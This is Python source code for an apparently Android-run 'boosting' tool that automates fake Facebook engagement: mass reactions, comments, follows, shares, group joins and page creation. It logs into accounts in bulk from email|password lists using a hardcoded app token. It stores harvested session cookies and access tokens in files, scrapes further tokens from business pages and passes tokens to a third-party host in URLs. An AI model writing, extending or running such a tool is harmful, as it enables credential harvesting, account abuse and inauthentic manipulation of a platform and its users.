    print(f'''{c}┃{YELLOW}「04」{white}AUTO COMMENT             {c}-  {YELLOW}「Normal Account Only」   {c}  ┃''')
    print(f'''{c}┃{YELLOW}「05」{white}AUTO FOLLOW              {c}-  {YELLOW}「Page & Normal Account」 {c}  ┃''')
    print(f'''{c}┃{YELLOW}「06」{white}AUTO COMMENT REELS       {c}-  {YELLOW}「Page & Normal Account」 {c}  ┃''')
    print(f'''{c}┃{YELLOW}「07」{white}AUTO REACT REELS         {c}-  {YELLOW}「Page & Normal Account」 {c}  ┃''')
    print(f'''{c}┃{YELLOW}「08」{white}AUTO COMMENT LIVE        {c}-  {YELLOW}「Page & Normal Account」 {c}  ┃''')
    print(f'''{c}┃{YELLOW}「09」{white}AUTO REACT LIVE          {c}-  {YELLOW}「Page & Normal Account」 {c}  ┃''')
    print(f'''{c}┃{YELLOW}「10」{white}AUTO SHARE {yellow}[METHOD 1]    {c}-  {YELLOW}「Normal Account Only」   {c}  ┃''')
    print(f'''{c}┃{YELLOW}「11」{white}AUTO SHARE {yellow}[METHOD 2]    {c}-  {YELLOW}「Page & Normal Account」 {c}  ┃''')
    print(f'''{c}┃{YELLOW}「12」{white}AUTO GROUP JOIN          {c}-  {YELLOW}「Facebook Page Only」    {c}  ┃''')
    print(f'''{c}┃{YELLOW}「13」{white}AUTO ADDFRIEND           {c}- {YELLOW} 「Page & Normal Account」  {c} ┃''')
    print(f'''{c}┃{YELLOW}「14」{white}AUTO CREATE PAGE         {c}- {YELLOW} 「Normal Account Only」    {c} ┃''')
    print(f'''{c}┃{YELLOW}「15」{GREEN}TOKEN GETTER             {c}-  {YELLOW}「Normal Account Only     {c}  ┃''')
    print(f'''{c}┃{YELLOW}「16」{GREEN}ACCOUNT CHECKER          {c}- {YELLOW} 「Page & Normal Account」 {c}  ┃''')
    print(f'''{c}┃{YELLOW}「17」{GREEN}UPDATE TOOLS                                          {c}  ┃''')
    print(f'''{c}┃{YELLOW}「18」{red}REMOVE DUPLICATE                                     {c}   ┃''')
    print(f'''{c}┃{YELLOW}「19」{red}REMOVE ALL TOKEN                                      {c}  ┃''')
    print(f'''{c}┃{YELLOW}「00」{red}EXIT                                                  {c}  ┃''')
    print(f'{c}┗━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛{wh}')
    choice = input(f'''{c}  ┗━━⫸ : ''').upper()
    if choice == '1' or choice == '01':
        start_tool()
        return None
    if choice == '2' or choice == '02':
        choicereact()
        return None
    if choice == '3' or choice == '03':
      quick_reaction()
      return None
    if choice == '4' or choice == '04':
        Coms()
        return None
    if choice == '5' or choice == '05':
        follow()
        return None
    if choice == '6' or choice == '06':
      comment_reels()
      return None
    if choice == '7' or choice == '07':
      react_on_reels()
      return None
    if choice == '8' or choice == '08':
      comment_on_live()
      return None
    if choice == '9' or choice == '09':
      react_to_live()
      return None
    if choice == '10':
        main_share()
        return None
    if choice == '11':
      spam_sharev2()
      return None
    if choice == '12':
        join_groupp()
        return None
    if choice == '13':
      auto_add_friends()
      return None
    if choice == '14':
      Cpage()
      return None
    if choice == '15':
      TOKEN()
      return None
    if choice == '16':
      acc_checker()
      return None
    if choice == '17':
        clone_or_update_repo()
        return None
    if choice == '18':
      remove_duplicates()
      return None
    if choice == '19':
      reset()
    if choice == '0'or choice == '00':
        print(f'''\n{red}Thank You For Using Spectre Boosting Tools''')
        return None
    else:
        print(f'''{red}INVALID CHOICE.''')
        return None
        
import requests
import uuid
import random
import os
import re
import time
import threading


def cuser(user, passw, user_choice):
    accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'

    data = {
        'adid': str(uuid.uuid4()),
        'format': 'json',
        'device_id': str(uuid.uuid4()),
        'cpl': 'true',
        'family_device_id': str(uuid.uuid4()),
        'credentials_type': 'device_based_login_password',
        'error_detail_type': 'button_with_disabled',
        'source': 'device_based_login',
        'email': user,
        'password': passw,
        'access_token': accessToken,
        'generate_session_cookies': '1',
        'advertiser_id': str(uuid.uuid4()),
        'currently_logged_in_userid': '0',
        'locale': 'en_US',
        'client_country_code': 'US',
        'method': 'auth.login',
        'fb_api_req_friendly_name': 'authenticate',
        'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
        'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
    }

    headers = {
        'User-Agent': "Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/en_US;FBBV/135374479;FBCR/SMART;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
        'Content-Type': 'application/x-www-form-urlencoded',
        'Host': 'graph.facebook.com',
        'X-FB-Net-HNI': str(random.randint(10000, 99999)),
        'X-FB-SIM-HNI': str(random.randint(10000, 99999)),
        'X-FB-Connection-Type': 'MOBILE.LTE',
        'X-Tigon-Is-Retry': 'False',
        'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
        'x-fb-device-group': str(random.randint(1000, 9999)),
        'X-FB-Friendly-Name': 'ViewerReactionsMutation',
        'X-FB-Request-Analytics-Tags': 'graphservice',
        'X-FB-HTTP-Engine': 'Liger',
        'X-FB-Client-IP': 'True',
        'X-FB-Connection-Bandwidth': str(random.randint(20000000, 30000000)),
        'X-FB-Server-Cluster': 'True',
        'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'
    }

    pos = requests.post("https://b-graph.facebook.com/auth/login", headers=headers, data=data, allow_redirects=False).json()

    if "session_key" in pos:
        print(f"{GREEN}SUCCESSFULLY --> {user} EXTRACTED SUCCESSFULLY.{RESET}")
        linex()
        cookie = ';'.join(i['name'] + '=' + i['value'] for i in pos['session_cookies'])
        c_user_value = next((i['value'] for i in pos['session_cookies'] if i['name'] == 'c_user'), None)

        if user_choice.lower() in ['n', 'no']:
            with open('/sdcard/BOOSTING/tokpid.txt', 'a') as f:
                f.write(f'{c_user_value}\n')
            with open('/sdcard/BOOSTING/tokp.txt', 'a') as f:
                f.write(f'{pos["access_token"]}\n')
        else:
            with open('/sdcard/BOOSTING/toka.txt', 'a') as f:
                f.write(f'{pos["access_token"]}\n')
            with open('/sdcard/BOOSTING/tokaid.txt', 'a') as f:
                f.write(f'{c_user_value}\n')

        with open('/sdcard/BOOSTING/cok.txt', 'a') as f:
            f.write(f'{cookie}\n')
        with open('/sdcard/BOOSTING/cokid.txt', 'a') as f:
            f.write(f'{c_user_value}\n')
    else:
        print(f"{RED}FAILED --> {user} ISN'T EXTRACTED. {RESET}")
        linex()

def bot_detection(user, passw):
    sleep_time = random.uniform(0.1, 0.2)
    print(f"Sleeping for {sleep_time:0.2f} seconds to mimic human behavior...")
    time.sleep(sleep_time)

    if re.match(r"admin|test|root|guest|user\d+", user.lower()):
        print(f"{RED}Suspicious username detected: {user}. Likely a bot.{RESET}")
        return True
    return False

def process_users(user_list, user_choice):
    for user_pass in user_list:
        if len(user_pass) == 2:
            user, passw = user_pass
            cuser(user, passw, user_choice)
        else:
            print(f"INVALID FORMAT IN LINE: {user_pass}")

def Manual():
    clear()
    user_choice = input(f"{WHITE}INPUT Y OR LEAVE BLANK IF IT'S ACCOUNT, IF IT'S A PAGE THEN INPUT N (y/Y/yes/Yes or n/N/no/No or d/D/default/Default): {RESET}")
    linex()
    user = input(f"{WHITE}USER ID/EMAIL: {RESET}")
    passw = input(f"{WHITE}PASSWORD: {RESET}")
    linex()
    cuser(user, passw, user_choice)

def Auto():
    directory = '/sdcard'
    txt_files = [f for f in os.listdir(directory) if f.endswith('.txt')]
    if not txt_files:
        print(f'{RED}NO .TXT FILES FOUND IN {directory}{RESET}')
        return

    for i, filename in enumerate(txt_files, start=1):
        print(f"{i}  {filename}")

    try:
        linex()
        choice = int(input(f'{WHITE}「Choose」 : {RESET}'))
        if 1 <= choice <= len(txt_files):
            selected_file = os.path.join(directory, txt_files[choice - 1])
            if os.path.isfile(selected_file):
                try:
                    user_choice = input(f"{YELLOW}INPUT Y OR LEAVE BLANK IF IT'S ACCOUNT, IF IT'S A PAGE THEN INPUT N (y/Y/yes/Yes or n/N/no/No or d/D/default/Default): {RESET}")
                    linex()
                    with open(selected_file, 'r') as file:
                        threads = []
                        for line in file:
                            user_pass = line.strip().split('|')
                            thread = threading.Thread(target=process_users, args=([user_pass], user_choice))
                            thread.start()
                            threads.append(thread)
                        for thread in threads:
                            thread.join()
                except Exception as e:
                    print(f'{RED}ERROR READING THE FILE : {e}{RESET}')
            else:
                print(f'{RED}FILE NOT FOUND{RESET}')
        else:
            print(f'{RED}INVALID OPTION.{RESET}')
    except ValueError:
        print(f'{RED}INVALID INPUT.{RESET}')

def ManFile():
    clear()
    file = input(f'{WHITE}PUT FILE PATH: {RESET}')
    linex()
    if os.path.isfile(file):
        try:
            user_choice = input(f"{YELLOW}INPUT Y OR LEAVE BLANK IF IT'S ACCOUNT, IF IT'S A PAGE THEN INPUT N (y/Y/yes/Yes or n/N/no/No or d/D/default/Default): {RESET}")
            linex()
            seen_users = set()
            with open(file, 'r') as file:
                for line in file:
                    user_pass = line.strip().split('|')
                    if bot_detection(user_pass[0], user_pass[1]):
                        continue
                    if user_pass[0] in seen_users:
                        print(f"{RED}Duplicate user detected: {user_pass[0]}. Skipping...{RESET}")
                        continue
                    seen_users.add(user_pass[0])
                    process_users([user_pass], user_choice)
        except Exception as e:
            print(f'{RED}ERROR READING THE FILE: {e}{RESET}')
    else:
        print(f'{RED}FILE LOCATION NOT FOUND{RESET}')

def start_tool():
    clear()
    linex()
    print(f"{WHITE}「1」MANUAL THROUGH INPUT")
    print(f"{WHITE}「2」MANUAL THROUGH FILE")
    print(f"{WHITE}「3」AUTOMATIC THROUGH OPTION")
    print(f'{white}「0」BACK TO MENU!')
    linex()
    me = input(f'{WHITE}「Choose」 : ')
    if me == '1':
        Manual()
    if me == '2':
    	ManFile()
    if me == '3':
        Auto()
    if me == '0' or me == '00':
      menu()
    else:
        print(f'{red}INVALID OPTION.')


def choicereact():
  clear()
  linex()
  print(f"{yellow}[1]{white} REACT POST")
  print(f"{yellow}[2]{white} REMOVE REACT <=> Fixing")
  print(f"{yellow}[0]{white} BACK TO MENU")
  linex()
  Chooce = input(f'{WHITE}「Choose」 : ')
  if Chooce == '1':
    quickreact()
  if Chooce == '2':
    quickremove()
  if Chooce == '0' or Chooce == '3':
    menu()

def Reaction(actor_id: str, post_id: str, react: str, token: str):
    url = f'https://fbapi-production.up.railway.app/reaction?token={token}&post={post_id}&react={react}'

    try:
        response = requests.get(url)
        if response.json()['status'] == True:
            print(f"{GREEN}Successfully reacted: {actor_id} ☛ {post_id} with {react}")
        else:
            print(f"{RED}Failed to react: {actor_id} ☛ {post_id} with {react}")
            print(f"Error: {response.status_code} - {response.text}")

        linex()

    except Exception as e:
        print(f'Error in Reaction: {e}')

def choose_react():
    clear()
    linex()
    print("「1」LIKE")
    print("「2」LOVE")
    print("「3」HAHA")
    print("「4」WOW")
    print("「5」CARE")
    print("「6」SAD")
    print("「7」ANGRY")
    linex()

    rec = input('Choose: ')
    reactions = {
        '1': 'LIKE',  # LIKE
        '2': 'LOVE',  # LOVE
        '3': 'HAHA',  # HAHA
        '4': 'WOW',   # WOW
        '5': 'CARE',  # CARE
        '6': 'SAD',   # SAD
        '7': 'ANGRY'  # ANGRY
    }

    return reactions.get(rec, None)

def get_ids_tokens(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file]

def quickreact():
    clear()
    actor_ids = get_ids_tokens('/sdcard/BOOSTING/tokaid.txt')
    tokens = get_ids_tokens('/sdcard/BOOSTING/toka.txt')

    post_link = input('ENTER THE FACEBOOK POST LINK: ')
    limit = int(input(f'Input quantity of reactions, limit is {len(tokens)}: '))
    post_id = post_link
    react = choose_react()

    if react:
        threads = []

        for actor_id, token in zip(actor_ids, tokens):
            if len(threads) < limit:
                thread = threading.Thread(target=Reaction, args=(actor_id, post_id, react, token))
                threads.append(thread)
                thread.start()

        for thread in threads:
            thread.join()


import requests
import threading
import json
import base64
import uuid
import time

def react_to_post(actor_id: str, post_id: str, react: str, token: str):
    rui = requests.Session()

    var = {
        "input": {
            "feedback_referrer": "native_newsfeed",
            "tracking": None,
            "feedback_id": base64.b64encode(f'feedback:{post_id}'.encode('utf-8')).decode('utf-8'),
            "client_mutation_id": str(uuid.uuid4()),
            "nectar_module": "newsfeed_ufi",
            "feedback_source": "native_newsfeed",
            "attribution_id_v2": "NewsFeedFragment,native_newsfeed,cold_start,1710331848.276,264071715,4748854339,,",
            "feedback_reaction_id": react,
            "actor_id": actor_id,
            "action_timestamp": str(int(time.time()))
        }
    }

    data = {
        'access_token': token,
        'method': 'post',
        'pretty': False,
        'format': 'json',
        'server_timestamps': True,
        'locale': 'id_ID',
        'fb_api_req_friendly_name': 'ViewerReactionsMutation',
        'fb_api_caller_class': 'graphservice',
        'client_doc_id': '2857784093518205785115255697',
        'variables': json.dumps(var),
        'fb_api_analytics_tags': ["GraphServices"],
        'client_trace_id': str(uuid.uuid4())
    }

    try:
        response = rui.post('https://graph.facebook.com/graphql', data=data)
        pos = response.json()

        if "Failed" in pos:
            print(f"{RED}Failed to react: {actor_id} ☛ {post_id}{RESET}")
            linex()
        else:
            print(f"{GREEN}Successfully reacted: {actor_id} ☛ {post_id}{RESET}")
            linex()

    except Exception as e:
        print(f'{RED}Error in reaction: {e}{RESET}')

def choose_reactions():
    print("\nChoose a reaction:")
    linex()
    print("1: LIKE")
    print("2: LOVE")
    print("3: HAHA")
    print("4: WOW")
    print("5: CARE")
    print("6: SAD")
    print("7: ANGRY")
    linex()
    rec = input('Choose: ')

    reactions = {
        '1': '1635855486666999',  # LIKE
        '2': '1678524932434102',  # LOVE
        '3': '115940658764963',   # HAHA
        '4': '478547315650144',   # WOW
        '5': '613557422527858',   # CARE
        '6': '908563459236466',   # SAD
        '7': '444813342392137'    # ANGRY
    }

    return reactions.get(rec)

def quick_reaction():
    def get_ids_tokens(file_path):
        try:
            with open(file_path, 'r') as file:
                return [line.strip() for line in file]
        except FileNotFoundError:
            print(f"{RED}File not found: {file_path}{RESET}")
            return []

    # Replace with actual file paths
    actor_ids = get_ids_tokens('/sdcard/BOOSTING/tokaid.txt')
    tokens = get_ids_tokens('/sdcard/BOOSTING/toka.txt')

    if not actor_ids or not tokens:
        print(f"{RED}Actor IDs or tokens are missing!{RESET}")
        return

    post_link = input('Enter the Facebook post link: ')
    limit = int(input(f'Input quantity of reactions, limit is {len(tokens)}: '))

    post_id = linktradio(post_link)

    react = choose_reactions()
    if not react:
        print(f"{RED}Invalid reaction choice!{RESET}")
        return

    threads = []
    count = 0

    for actor_id, token in zip(actor_ids, tokens):
        if count >= limit:
            break
        thread = threading.Thread(target=react_to_post, args=(actor_id, post_id, react, token))
        threads.append(thread)
        thread.start()
        count += 1

    for thread in threads:
        thread.join()

    print(f"{GREEN}All reactions completed!{RESET}")

import requests
from concurrent.futures import ThreadPoolExecutor

def get_token(input_file):
    headers_template = {
        'authority': 'business.facebook.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'max-age=0',
        'referer': 'https://www.facebook.com/',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
    }

    tokens = []
    for cookie in input_file:
        headers_template['cookie'] = cookie
        try:
            response = requests.get(
                'https://business.facebook.com/content_management',
                headers=headers_template,
                timeout=5
            )
            if response.ok and 'EAAG' in response.text:
                token = response.text.split('EAAG')[1].split('","')[0]
                tokens.append(f"{cookie}|EAAG{token}")
        except Exception as e:
            print(f"Error fetching token for cookie: {cookie}. Details: {e}")
    return tokens

# Perform share action
def share(tach, id_share):
    cookie, token = tach.split('|')
    headers = {
        'accept': '*/*',
        'cookie': cookie,
    }

    try:
        requests.post(
            f'https://graph.facebook.com/me/feed?link=https://m.facebook.com/{id_share}&published=0&access_token={token}',
            headers=headers,
            timeout=5
        )
    except Exception as e:
        print(f"Error sharing post with token: {token}. Details: {e}")

def main_share():
    try:
        # Input paths and details
        file_path = '/sdcard/BOOSTING/cok.txt'
        id_share = input("POST ID to Share: ")
        total_share = int(input("Total Shares to Perform: "))
        linex()

        # Read cookies from file
        with open(file_path, 'r') as f:
            input_file = f.read().strip().split('\n')

        # Get tokens
        tokens = get_token(input_file)
        if not tokens:
            print("No valid tokens found.")
            return

        print(f"Total Valid Tokens: {len(tokens)}")
        print("Starting to share...")

        # Perform sharing
        with ThreadPoolExecutor(max_workers=30) as executor:
            for i, tach in enumerate(tokens * (total_share // len(tokens) + 1), start=1):
                if i > total_share:
                    break
                executor.submit(share, tach, id_share)
                print(f"{GREEN}[{i}] SUCCESS SHARE ID: {id_share}", end='\r')

        linex()
        print(f"Shares completed. Total shares: {total_share}")
    except FileNotFoundError:
        print(f"Error: File '{file_path}' not found.")
    except ValueError:
        print("Error: Invalid input. Please provide valid POST ID and number of shares.")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")



def Coms():
  clear()
  linex()
  print(f'「01」SAME COMMENTS')
  print(f'「02」CUSTOMS COMMENT')
  print(f'「00」BACK TO MENU')
  linex()
  coms = input(f'{WHITE}「Choose」 : ')
  if coms in ['1','01']:
    auto_comments()
    return None
  elif coms in ['2', '02']:
    auto_commentsv2()
    return None
  elif coms in ['0', '00']:
    menu()
    return None

def get_ids_tokens(file_path):
        with open(file_path, 'r') as file:
            return [line.strip() for line in file]

def linktradio(post_link):
    try:
        if 'photo.php?fbid=' in post_link:
            post_id = post_link.split('fbid=')[1].split('&')[0]
        elif '/posts/' in post_link:
            post_id = post_link.split('/posts/')[1].split('/')[0]
        else:
            print("INVALID POST LINK.")
            return None
        return post_id
    except IndexError:
        print("COULD NOT EXTRACT POST ID.")
        return None

def auto_comments():
    clear()
    user_ids = get_ids_tokens('/sdcard/BOOSTING/tokaid.txt')
    access_tokens = get_ids_tokens('/sdcard/BOOSTING/toka.txt')
    user_name = get_user_name()
    post_link = input('ENTER THE FACEBOOK POST LINK: ')
    post_id = linktradio(post_link)

    comment_text = input('ENTER THE COMMENT TEXT (OR LEAVE BLANK FOR AUTO COMMENT): ')
    num_comments = int(input('ENTER THE NUMBER OF COMMENTS TO MAKE: '))

    if not comment_text:
        current_time = datetime.now().strftime("%I:%M %p")
        current_date = datetime.now().strftime("%Y-%m-%d")
        comment_text = f'TIME: {current_time} {current_date}\nAUTO COMMENT BY {user_name}'

    def has_commented(post_id, access_token, user_id):
        url = f'https://graph.facebook.com/v18.0/{user_id}_{post_id}/comments'
        params = {'access_token': access_token}
        try:
            response = requests.get(url, params=params)
            response.raise_for_status()
            comments = response.json().get('data', [])
            return any(comment['from']['id'] == user_id for comment in comments)
        except requests.exceptions.RequestException:
            print(f"{GREEN}SUCCESSFULLY TO  COMMENTS ON {post_id}")
            linex()
            return False

    def post_comment(user_id, access_token):
        if not has_commented(post_id, access_token, user_id):
            url = f'https://graph.facebook.com/v19.0/{user_id}_{post_id}/comments'
            params = {'access_token': access_token, 'message': comment_text}
            try:
                response = requests.post(url, params=params)
                if response.status_code == 200:
                    return True
                else:
                    print(f"FAILED TO COMMENT ON {post_id}")
            except requests.exceptions.RequestException:
                print(f"FAILED TO COMMENT ON {post_id}")
        return False

    comments_count = 0
    user_count = len(user_ids)
    futures = []

    with ThreadPoolExecutor(max_workers=user_count) as executor:
        for _ in range(num_comments):
            for i in range(user_count):
                user_id = user_ids[i]
                access_token = access_tokens[i]
                futures.append(executor.submit(post_comment, user_id, access_token))

        for future in as_completed(futures):
            if future.result():
                comments_count += 1
                print(f"SUCCESSFULLY COMMENTED ON {post_id}")
                if comments_count >= num_comments:
                    print(f"SUCCESSFULLY COMMENTED {num_comments} TIMES.")
                    return

    print(f"TOTAL SUCCESSFULLY COMMENTED: {comments_count}")
    
def auto_commentsv2():
    clear()
    user_ids = get_ids_tokens('/sdcard/BOOSTING/tokaid.txt')
    access_tokens = get_ids_tokens('/sdcard/BOOSTING/toka.txt')
    user_name = get_user_name()

    post_link = input('ENTER THE FACEBOOK POST LINK: ')
    post_id = linktradio(post_link)

    num_comment_texts = int(input('ENTER THE NUMBER OF DIFFERENT COMMENT TEXTS (1 TO 100): '))
    comment_texts = []

    for i in range(num_comment_texts):
        comment_text = input(f'ENTER COMMENT TEXT {i+1}: ')
        if not comment_text:
            current_time = datetime.now().strftime("%I:%M %p")
            current_date = datetime.now().strftime("%Y-%m-%d")
            comment_text = f'TIME: {current_time} {current_date}\nAUTO COMMENT BY {user_name}'
        comment_texts.append(comment_text)

    num_comments = int(input('ENTER THE NUMBER OF COMMENTS TO MAKE: '))

    def has_commented(post_id, access_token, user_id):
        url = f'https://graph.facebook.com/v18.0/{user_id}_{post_id}/comments'
        params = {'access_token': access_token}
        try:
            response = requests.get(url, params=params)
            response.raise_for_status()
            comments = response.json().get('data', [])
            return any(comment['from']['id'] == user_id for comment in comments)
        except requests.exceptions.RequestException:
            return False

    def post_comment(user_id, access_token):
        if not has_commented(post_id, access_token, user_id):
            comment_text = random.choice(comment_texts)
            url = f'https://graph.facebook.com/v19.0/{user_id}_{post_id}/comments'
            params = {'access_token': access_token, 'message': comment_text}
            try:
                response = requests.post(url, params=params)
                if response.status_code == 200:
                    return True
            except requests.exceptions.RequestException:
                pass
        return False

    comments_count = 0
    user_count = len(user_ids)
    futures = []

    with ThreadPoolExecutor(max_workers=user_count) as executor:
        for i in range(num_comments):
            random_user_index = random.randint(0, user_count - 1)
            user_id = user_ids[random_user_index]
            access_token = access_tokens[random_user_index]
            futures.append(executor.submit(post_comment, user_id, access_token))

        for future in as_completed(futures):
            if future.result():
                comments_count += 1
                print(f"{GREEN}SUCCESSFULLY COMMENTED ON {post_id}")
                linex()
                if comments_count >= num_comments:
                    print(f"SUCCESSFULLY COMMENTED {num_comments} TIMES.")
                    linex()
                    return

    print(f"{c}TOTAL SUCCESSFULLY COMMENTED: {comments_count}")
    print(f'TARGET : {post_link[:40]}')


class reg_pro5:
    def __init__(self, cookies, name) -> None:
        self.cookies = cookies

        if 'c_user=' not in self.cookies:
            raise ValueError("The provided cookies string is missing 'c_user='.")

        try:
            self.id_acc = self.cookies.split('c_user=')[1].split(';')[0]
        except IndexError:
            raise ValueError("Unable to extract 'c_user=' from the provided cookies string.")

        headers = {
            'authority': 'www.facebook.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cookie': self.cookies,
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
        }

        session = requests.Session()
        session.headers.update(headers)

        try:
            response = session.get('https://www.facebook.com/me')
            response.raise_for_status()

            print(f"Debug: HTTP Status Code: {response.status_code}")
            print(f"Debug: Response Content (First 500 chars): {response.text[:500]}")

            profile = response.text

            soup = BeautifulSoup(profile, 'html.parser')
            fb_dtsg_input = soup.find('input', {'name': 'fb_dtsg'})

            if fb_dtsg_input and 'value' in fb_dtsg_input.attrs:
                self.fb_dtsg = fb_dtsg_input['value']
            else:
                raise ValueError("Unable to find 'fb_dtsg' in the profile HTML.")
        except requests.exceptions.RequestException as e:
            raise RuntimeError(f"Failed to fetch profile page: {e}")
        except Exception as e:
            raise ValueError(f"Unexpected error during profile parsing: {e}")

def Cpage():
    cookies = input("Enter your Facebook cookies: ").strip()
    name = input("Enter profile name: ").strip()

    try:
        profile_creator = reg_pro5(cookies, name)
        print(f"Account ID: {profile_creator.id_acc}")
        print(f"FB DTSG Token: {profile_creator.fb_dtsg}")
    except ValueError as e:
        print(f"Error: {e}")
    except RuntimeError as e:
        print(f"Runtime Error: {e}")


def follow():
    clear()
    logo()
    linex()
    print(f"{WHITE}「1」FOLLOW")
    print(f"{WHITE}「2」REMOVE FOLLOW")
    print(f'{white}「3」BACK TO MENU')
    linex()
    me = input(f'{WHITE}「Choose」 : ')
    if me == '1':
      follow_facebook_profile()
    if me == '2':
      remove_facebook_follower()
    if me == '0':
      menu()
    else:
        print(f'{red}INVALID OPTION.')

def get_profile_id(profile_link, access_token):
    match_id = re.search(r'profile\.php\?id=(\d+)', profile_link)
    if match_id:
        return match_id.group(1)
    match_username = re.search(r'facebook\.com/([^/]+)', profile_link)
    if match_username:
        profile_username = match_username.group(1)
        url = f'https://graph.facebook.com/v19.0/{profile_username}'
        params = {'access_token': access_token, 'fields': 'id'}

        try:
            response = requests.get(url, params=params)
            response.raise_for_status()
            return response.json().get('id', '')
        except requests.exceptions.RequestException as e:
            print(f"{RED}ERROR: Could not retrieve profile ID using username.{reset}")
            print(f"Details: {e}")
            return None

    print(f"{RED}ERROR: Invalid Facebook profile URL format.{reset}")
    return None
    
def get_profile_username(profile_id, access_token): 
    url = f'https://graph.facebook.com/v19.0/{profile_id}'
    params = {'access_token': access_token, 'fields': 'name'}
    
    try:
        response = requests.get(url, params=params)
        response.raise_for_status()
        return response.json().get('name', 'Unknown Profile')
    except requests.exceptions.RequestException:
        return 'Unknown Profile'

def follow_profile(profile_id, access_token, follow_count, num_followers):
    try:
        url = f'https://graph.facebook.com/v19.0/{profile_id}/subscribers'
        params = {'access_token': access_token}
        response = requests.post(url, params=params)
        if response.status_code == 200:
            profile_name = get_profile_username(profile_id, access_token)
            print(f"{GREEN}SUCCESSFULLY FOLLOWED THE PROFILE '{profile_name}' WITH TOKEN {access_token[:5]}...")
            follow_count += 1
    except requests.exceptions.RequestException:
        print(f"{RED}FAILED TO FOLLOW THE PROFILE WITH TOKEN {access_token[:5]}{reset}")

    return follow_count

def follow_facebook_profile():
    clear()
    access_tokens = get_ids_tokens('/sdcard/BOOSTING/toka.txt')
    profile_link = input('ENTER THE FACEBOOK PROFILE LINK: ')

    profile_id = get_profile_id(profile_link.strip(), access_tokens[0])
    
    if not profile_id:
        print(f"{RED}ERROR: Could not retrieve profile ID.{reset}")
        return

    num_followers = int(input(f'INPUT THE LIMIT OF FOLLOWERS, limit is {len(access_tokens)}: '))
    follow_count = 0
    threads = []

    for access_token in access_tokens:
        if follow_count >= num_followers:
            break
        thread = threading.Thread(target=follow_profile, args=(profile_id, access_token, follow_count, num_followers))
        threads.append(thread)
        thread.start()
        follow_count += 1 
        
    for thread in threads:
        thread.join()

    print(f"{GREEN}SUCCESSFULLY FOLLOWED {follow_count} PROFILES OUT OF {num_followers} REQUESTED.{reset}")

def get_ids_tokens(file_path):  
    with open(file_path, 'r') as file:
        return [line.strip() for line in file]

def remove_facebook_follower():
    clear()

    access_tokens = get_ids_tokens('/sdcard/BOOSTING/toka.txt')
    profile_link = input('ENTER THE FACEBOOK PROFILE LINK TO REMOVE: ')


    profile_id = get_profile_id(profile_link.strip(), access_tokens[0])

    if not profile_id:
        print(f"{RED}ERROR: Could not retrieve profile ID.{reset}")
        return

    def remove_follower(profile_id, access_token):
        try:
            url = f'https://graph.facebook.com/v19.0/{profile_id}/subscribers'
            params = {'access_token': access_token}
            response = requests.delete(url, params=params)
            if response.status_code == 200:
                profile_name = get_profile_username(profile_id, access_token)
                print(f"{GREEN}SUCCESS: REMOVED THE FOLLOWER FROM PROFILE '{profile_name}' WITH TOKEN {access_token[:5]}")
            return response.status_code == 200
        except requests.exceptions.RequestException:
            return False

    remove_count = 0
    threads = []

    for access_token in access_tokens:
        thread = threading.Thread(target=remove_follower, args=(profile_id, access_token))
        threads.append(thread)
        thread.start()
        remove_count += 1
        
    for thread in threads:
        thread.join()

    print(f"{GREEN}SUCCESSFULLY REMOVED {remove_count} FOLLOWERS.{reset}")


def join_group(group_id, profile_id, access_token):  
    try:
        url = f'https://graph.facebook.com/{group_id}/members/{profile_id}'
        params = {'access_token': access_token}

        response = requests.post(url, params=params)

        if response.status_code == 200:
            return True
        else:
            print(f"{red}Failed to join: {response.status_code}, {response.text}{reset}")
            return False

    except requests.exceptions.RequestException as e:
        print(f"{red}Error occurred: {e}{reset}")
        return False

def extract_group_id(input_value):
    match = re.search(r'/groups/(\d+)', input_value)
    if match:
        return match.group(1)
    return input_value

def get_profile_id(profile_link, access_token):
    match_id = re.search(r'profile\.php\?id=(\d+)', profile_link)
    if match_id:
        return match_id.group(1)
    
    match_username = re.search(r'facebook\.com/([^/]+)', profile_link)
    if match_username:
        profile_username = match_username.group(1)
        url = f'https://graph.facebook.com/v19.0/{profile_username}'
        params = {'access_token': access_token, 'fields': 'id'}

        try:
            response = requests.get(url, params=params)
            response.raise_for_status()
            return response.json().get('id', None)
        except requests.exceptions.RequestException as e:
            print(f"{red}ERROR: Could not retrieve profile ID using username.{reset}")
            print(f"Details: {e}")
            return None

    print(f"{red}ERROR: Invalid Facebook profile URL format.{reset}")
    return None

def get_profile_link_from_token(access_token):
    url = f'https://graph.facebook.com/v19.0/me'
    params = {'access_token': access_token}
    response = requests.get(url, params=params)
    try:
        response.raise_for_status()
        return f"facebook.com/{response.json()['id']}"
    except requests.exceptions.RequestException as e:
        print(f"{red}Error retrieving profile link for token: {e}{reset}")
        return None

def join_group_worker(group_id, access_token, join_count, failed_count):
    profile_link = get_profile_link_from_token(access_token)
    if profile_link:
        profile_id = get_profile_id(profile_link, access_token)
        if profile_id:
            success = join_group(group_id, profile_id, access_token)
            if success:
                print(f"{GREEN}SUCCESS: GROUP ID {group_id}, USER ID {profile_id}{reset}")
                linex()
